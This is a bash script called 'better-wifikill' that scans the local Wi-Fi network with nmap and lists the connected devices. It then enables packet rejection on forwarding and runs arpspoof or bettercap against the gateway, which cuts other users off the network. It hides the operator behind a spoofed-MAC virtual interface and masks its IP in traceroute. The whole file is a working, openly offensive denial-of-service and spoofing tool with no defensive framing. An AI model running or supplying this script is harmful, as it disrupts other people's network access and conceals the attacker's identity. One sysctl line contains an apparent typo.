#!/bin/bash
# used part of https://github.com/asdfMaciej/wifikill-linux/ code
function usage
{
	echo "usage: better-wifikill [-i interface] [-n network/preffix] | [-h]]"
}

function get_network_address
{
	chmod +x mask-transform.py
	netmask_broadcast=$(ifconfig wlp2s0 | grep inet | grep -v inet6 | awk '{print $4 " " $6}') #
	local_net=$(./mask-transform.py $netmask_broadcast)
}

###### Main
interface=0
local_net=0
targets=0
while [ "$1" != "" ]; do
	case $1 in
	-i | --interface )	shift
				interface=$1
				;;
	-n | --network )     	shift
				local_net=$1
				;;
	-t | --targets ) 	shift
				targets=$1
				;;
	-h | --help )		usage
				exit
				;;
	* )                     usage
                                exit 1
    	esac
    shift
done
gateway=$(netstat -rn |grep 0.0.0.0 -m 1 | awk '{print $2}')

if [ $interface == "0" ]; then
    interface=$(ifconfig | grep RUNNING | grep -v "lo:" | awk -F ":" '{print $1}')
    echo "[INFO] $interface was automaticaly chosen as network interface"
fi

if [ $local_net == "0" ]; then
    get_network_address
    echo "[INFO] $local_net was automaticaly chosen as network "
fi
if [ $targets == "0" ]; then
    nmap_out=$(sudo nmap -sP $local_net)
    echo $nmap_out >> nmap.log
    own_ip=$(ifconfig $interface | grep inet | awk '{print $2}' | cut -d':' -f2) #gets your own ip
    temp_mac=$(echo "$nmap_out" | grep "MAC Address:" | awk '{print $3;}') #gets the mac addresses list
    temp_vendor=$(echo "$nmap_out" | grep "MAC Address:" | awk '{print $4;}') #gets the vendor list
    temp_name=$(echo "$nmap_out" | grep "scan report for" | awk '{print $5;}') #gets the name list
    temp_ip=$(echo "$nmap_out" | grep "scan report for" | awk '{print $6;}' | grep -v "$own_ip") #gets the ip list
    readarray -t mac <<<"$temp_mac" #converts it to array named mac
    readarray -t ip <<<"$temp_ip" #converts it to array named ip
    readarray -t vendor <<<"$temp_vendor"
    readarray -t name <<<"$temp_name"
    len=${#mac[@]} # length of mac addresses array
    echo "List of connected devices (name vendor: ip - mac):"
    echo "Your own ip address is $own_ip"
    for (( i=0; i<${len}; i++ ));
    do
	echo ${name[i]}" "${vendor[i]}": "${ip[i]}" - "${mac[i]}
    done
fi

cp /proc/sys/net/ipv4/ip_forward ip_forward.bak # backup forward config
iptables-save > iptables.bak # backup iptables config
echo "[INFO] iptables and forwarding config was backuped"
sudo echo "1" > /proc/sys/net/ipv4/ip_forward # enable forwarding
sudo iptables -P FORWARD REJECT # enable packet rejecting
echo "[INFO] Packet rejecting enabled"
sudo ip link add link $interface dev virt0 type macvlan # enable virtual interface with different mac
sudo ifconfig virt0 up
sudo dhcpcd virt0 # getting ip through dhcp
sudo dhcpcd +x virt0
sudo ifconfig virt0 down
sudo ifconfig virt0 up
sudo ip route add $local_net dev virt0 table 100 # enable routing rule that makes virt0 answer via virt0
sudo ip rule add iff virt0 lookup 100
sudo sysctl net.ipv4.conf.all.arp ignore=1 # disable answer from virt0 with real mac
sudo iptables -A INPUT -i virt0 -j DROP # do not allow virt0 portscan
sudo iptables -A OUTPUT -p icmp --icmp-type 11 -j DROP # hide real ip in traceroute
sudo iptables -t mangle -A PREROUTING -i virt0 -j TTL --ttl-inc 1 # incrementing ttl to not show routing via as in traceroute

# starting arpspoof
if [ $targets == "0" ]; then
    sudo arpspoof -i virt0 $gateway
else
    sudo bettercap -i virt0 -T $targets -G $gateway 
fi
